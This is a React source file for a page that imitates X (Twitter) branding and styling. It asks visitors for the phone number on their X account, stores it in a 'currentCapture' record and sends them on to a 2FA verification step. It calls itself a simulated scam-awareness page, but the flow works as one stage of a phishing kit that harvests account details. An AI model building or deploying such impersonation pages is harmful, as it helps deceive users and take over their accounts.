import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Helmet } from 'react-helmet';
import { X_LOGO_URL } from '@/config/constants';
import { useAppState } from '@/context/AppStateContext'; // Assuming useAppState provides showToast

export default function ConfirmPhoneNumberPage() {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneNumberError, setPhoneNumberError] = useState('');
  const navigate = useNavigate();
  const { showToast } = useAppState(); // showToast is still needed for system errors

  const handleConfirmNumber = () => {
    const phoneRegex = /^0\d{10}$/; 

    if (!phoneNumber.trim()) {
      setPhoneNumberError("Please enter your phone number.");
      return;
    }

    if (!phoneRegex.test(phoneNumber)) {
      setPhoneNumberError("Invalid phone number. Please enter an 11-digit number starting with 0.");
      return;
    }
    
    setPhoneNumberError(''); // Clear error if validation passes

    const currentCaptureString = localStorage.getItem('currentCapture');
    if (currentCaptureString) {
      try {
        const currentCapture = JSON.parse(currentCaptureString);
        localStorage.setItem('currentCapture', JSON.stringify({ ...currentCapture, phoneNumber }));
      } catch (error) {
        console.error("Error updating currentCapture in localStorage:", error);
        if (showToast) { // Keep toast for system/unexpected errors
          showToast({
            title: "Error",
            description: "Could not save phone number. Please try again.",
            variant: "destructive",
          });
        } else {
          console.error("showToast is not available for system error");
        }
        return;
      }
    } else {
        if (showToast) { // Keep toast for system/unexpected errors
          showToast({
              title: "Error",
              description: "Session data not found. Please start over.",
              variant: "destructive",
          });
        } else {
          console.error("showToast is not available for session error");
        }
        navigate('/login-verification'); // Or appropriate error/start page
        return;
    }
    navigate('/2fa-verification');
  };

  return (
    <>
      <Helmet>
        <title>Confirm Phone Number - X Verification</title>
        <meta name="description" content="Simulated X phone number confirmation page for scam awareness." />
      </Helmet>
      <div className="bg-[#1e1e2f] font-chirp text-white flex justify-center items-center min-h-screen p-4">
        <div className="bg-[#15202b] p-[30px] rounded-[10px] w-full max-w-[420px] text-center shadow-[0_0_15px_rgba(0,0,0,0.5)]">
          <img src={X_LOGO_URL} alt="X Logo" className="w-12 h-12 mx-auto mb-6" />
          <h2 className="text-[#1da1f2] text-2xl mb-[15px]">Confirm Phone Number</h2>
          <p className="text-[0.95em] mb-5 text-white">
            To complete this verification step, please enter the phone number currently registered on your X account.
          </p>
          <input
            type="text"
            placeholder="Enter your phone number"
            value={phoneNumber}
            onChange={(e) => {
              setPhoneNumber(e.target.value);
              if (phoneNumberError) setPhoneNumberError(''); // Clear error on new input
            }}
            className={`w-full p-3 my-[15px] bg-[#253341] border rounded-[6px] text-white text-[0.95em] box-border ${phoneNumberError ? 'border-red-500' : 'border-transparent'}`}
            maxLength="11"
          />
          {phoneNumberError && (
            <div className="text-red-500 text-sm text-left mb-3 -mt-2 px-1">
              {phoneNumberError}
            </div>
          )}
          <button
            onClick={handleConfirmNumber}
            className="w-full p-3 mb-[15px] bg-[#1da1f2] text-white border-none rounded-[6px] text-[1em] cursor-pointer hover:bg-[#1a91da] transition-colors"
          >
            Confirm Number
          </button>
          <div className="text-[0.85em] text-[#8899a6] mb-[10px]">
            Your number must match the one on file to proceed with verification.
          </div>
        </div>
      </div>
    </>
  );
}